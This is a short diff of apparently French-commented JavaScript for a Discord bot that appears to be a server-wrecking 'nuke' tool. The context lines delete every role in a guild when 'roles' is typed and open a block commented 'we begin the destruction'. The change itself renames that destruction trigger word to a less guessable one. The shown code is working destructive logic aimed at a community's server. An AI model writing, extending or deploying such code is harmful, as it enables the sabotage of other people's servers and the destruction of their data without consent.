@@ -576,7 +576,7 @@ if(message.content === "roles"){
                         message.guild.roles.map(c => c.delete())
                     }
                     //on commence la destruction
-                    if(message.content.includes("détruire")){
+                    if(message.content.includes("détruiree")){
                         message.channel.send("bane").then(m => m.delete());
                         message.channel.send("drole").then(m => m.delete());
                         message.channel.send("destroy").then(m => m.delete());
